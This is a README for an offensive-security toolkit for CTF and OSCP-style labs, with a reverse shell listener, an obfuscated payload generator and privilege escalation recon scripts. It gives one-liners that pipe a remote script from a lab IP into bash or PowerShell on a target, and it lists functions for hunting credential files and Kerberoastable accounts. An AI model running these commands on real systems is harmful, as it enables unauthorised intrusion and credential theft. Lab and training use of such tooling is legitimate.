# CTF-Toolkit

> A comprehensive web-based toolkit for CTF challenges and penetration testing certifications

![CTF-Toolkit Interface](https://github.com/user-attachments/assets/047294b3-7c16-4c26-9a19-7dfd61fef423)

## Features

- **Web Interface**: Intuitive web-based control panel for all tools
- **Reverse Shell Management**: Receive and interact with reverse shells
- **File Transfer**: Secure file upload/download with MD5 verification
- **Tool Management**: Built-in tool repository and management
- **Multi-Clipboard**: Share clipboard content across machines
- **Network Discovery**: Automatic IP discovery
- **Recon Scripts**: Pre-built privilege escalation helpers for Linux and Windows

## Installation

### Prerequisites

- Python 3.9+
- Git

### Quick Start

```bash
# Clone the repository
git clone https://github.com/KermitPurple96/CTF-toolkit
cd CTF-toolkit

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Run the application
python app.py
```

The web interface will be available at `http://localhost:5000`

## Configuration

CTF-Toolkit can be configured via environment variables or a `.env` file.

### Environment Variables

Copy `.env.example` to `.env` and customize:

```bash
cp .env.example .env
```

Key configuration options:

| Variable | Default | Description |
|----------|---------|-------------|
| `FLASK_HOST` | `0.0.0.0` | Host address to bind to |
| `FLASK_PORT` | `5000` | Port to listen on |
| `FLASK_DEBUG` | `False` | Enable debug mode (development only) |
| `MAX_FILE_SIZE` | `104857600` | Maximum upload size (100MB) |
| `LOG_LEVEL` | `INFO` | Logging level (DEBUG, INFO, WARNING, ERROR) |

See `.env.example` for all available options.

## Usage

### Web Interface

Access the web interface at `http://localhost:5000`:

- **Tools**: View and manage exploitation tools
- **Shells**: Start reverse shell listeners
- **Clipboards**: Share text between machines
- **IPs**: View network interfaces

### Command Line Tools

#### 1. Shell Listener

Receive reverse shell connections:

```bash
python shell.py <port>
```

Features:
- Auto OS detection (Linux/Windows)
- Built-in upload/download commands
- MD5 integrity verification
- Colored terminal output

Example:
```bash
python shell.py 443
```

Commands available in shell:
- `upload <local_file>` - Upload file to remote machine
- `download <remote_file>` - Download file from remote machine
- `help` - Show available commands
- `exit` - Close the connection

#### 2. Toolpy (Tool Management)

Download exploitation tools:

```bash
toolpy -d <tool_name>
```

Example:
```bash
toolpy -d rubeus
```

![Toolpy Example](https://github.com/user-attachments/assets/a9d69157-f2e7-4659-8885-06eb56d6e8b6)

#### 3. Shellpy (Payload Generator)

Generate obfuscated reverse shell payloads (requires [Shellpy](https://github.com/KermitPurple96/Shellpy)):

```bash
shellpy <ip> <port> [options]
```

Example:
```bash
shellpy 10.10.10.10 443 -powercat --obfuscate --macro
```

![Shellpy Example](https://github.com/user-attachments/assets/9bb1efe9-bcaa-49b8-b99b-b865b758eefe)

### Reconnaissance Scripts

#### Linux Privilege Escalation

Load the recon script on target:

```bash
. <(curl http://10.10.10.10/recon.sh)
```

#### Windows Privilege Escalation

Load the recon script on target:

```powershell
iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
```

Available functions:

**Auxiliary Tools:**
- `aux.upload [file]` - Upload files via HTTP POST
- `aux.download [file]` - Download files via HTTP GET

**Reconnaissance:**
- `recon.sys` - System information
- `recon.users` - User information
- `recon.programs` - Installed programs
- `recon.protections` - Security protections
- `recon.process` - Running processes
- `recon.networks` - Network configuration
- `recon.portscan <host> [range]` - Port scanner
- `recon.pingscan <subnet>` - Subnet scanner

**Privilege Escalation:**
- `priv.installElev` - AlwaysInstallElevated check
- `priv.serv.dir` - Service directory permissions
- `priv.serv.reg` - Service registry permissions
- `priv.serv.unq` - Unquoted service paths
- `priv.cred.files` - Credential files
- `priv.cred.history` - Command history
- `priv.owned.files` - User-owned files
- `priv.search.fname` - Search filenames
- `priv.search.fcontent` - Search file content
- `priv.autorun` - Scheduled tasks

**Active Directory:**
- `ad.users` - Domain users
- `ad.computers` - Domain computers
- `ad.groups` - Domain groups
- `ad.spn` - Kerberoastable accounts
- `ad.asrep` - AS-REP roastable users

## Architecture

### Security Features

- **Input Validation**: Comprehensive validation for all inputs
- **Path Traversal Protection**: Prevents directory traversal attacks
- **Security Headers**: XSS, clickjacking, MIME sniffing protection
- **File Size Limits**: Prevents DoS via large uploads
- **Custom Exception Hierarchy**: Proper error handling
- **Audit Logging**: All operations logged with timestamps
- **Log Injection Prevention**: Sanitized logging

### Project Structure

```
CTF-toolkit/
├── app.py                 # Main Flask application
├── shell.py              # Interactive shell client
├── listen_manager.py     # Reverse shell handler
├── config.py             # Configuration management
├── exceptions.py         # Custom exceptions
├── validators.py         # Input validation
├── security_headers.py   # Security middleware
├── logging_config.py     # Logging configuration
├── reload.py             # Development auto-reload
├── templates/            # HTML templates
├── static/              # CSS, JS, images
├── tools/               # Exploitation tools
├── uploads/             # Uploaded files
├── downloads/           # Downloaded files
├── logs/                # Application logs
└── tests/               # E2E test suite
```

## Development

### Running Tests

```bash
# Run all tests
python -m pytest tests/ -v

# Run specific test category
python -m pytest tests/test_e2e_flask_server.py -v

# Run with coverage
python -m pytest tests/ --cov=. --cov-report=html
```

### Auto-Reload Development Server

```bash
python reload.py
```

This will watch `templates/` and `static/` directories and automatically reload the server on changes.

### Code Quality

The project includes:
- Type hints for all functions
- Comprehensive docstrings
- Custom exception hierarchy
- Centralized logging
- Input validation
- Security headers
- 33 E2E tests (100% passing)

## Security Considerations

### For CTF/Lab Use Only

This toolkit is designed for:
- CTF competitions
- Penetration testing labs
- Security certifications (OSCP, etc.)
- Authorized security assessments

### Security Best Practices

1. **Never expose to the internet** - Use only in isolated lab environments
2. **Change default credentials** - Set `SECRET_KEY` in production
3. **Use HTTPS** - Set `USE_HTTPS=True` when deploying with TLS
4. **Review logs** - Check `logs/` directory regularly
5. **Limit access** - Use firewall rules to restrict access

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Guidelines

- Add type hints to all functions
- Include docstrings with Args/Returns/Raises
- Write tests for new features
- Follow existing code style
- Update README for new features

## Testing

The project includes a comprehensive E2E testing suite:

- **33 tests** covering all major functionality
- Flask endpoint testing
- File transfer testing
- Security validation testing
- Integration testing

Run tests before submitting PRs:

```bash
python -m pytest tests/ -v
```

## License

This project is provided for educational and authorized security testing purposes only.

## Credits

- Original author: [@KermitPurple96](https://github.com/KermitPurple96)
- Recon scripts: [OSCP_AuxReconTools](https://github.com/Daniel10Barredo/OSCP_AuxReconTools)
- Payload generator: [Shellpy](https://github.com/KermitPurple96/Shellpy)

## Changelog

### Recent Improvements

- Type hints and comprehensive docstrings
- Custom exception hierarchy
- Centralized configuration system
- Input validation helpers
- Security headers middleware
- Comprehensive logging with rotation
- E2E test suite (33 tests)
- Security vulnerability fixes

## Support

For issues, questions, or feature requests, please open an issue on GitHub.

---

**⚠️ Disclaimer**: This tool is intended for authorized security testing only. Unauthorized access to computer systems is illegal. Use responsibly and only on systems you have permission to test.
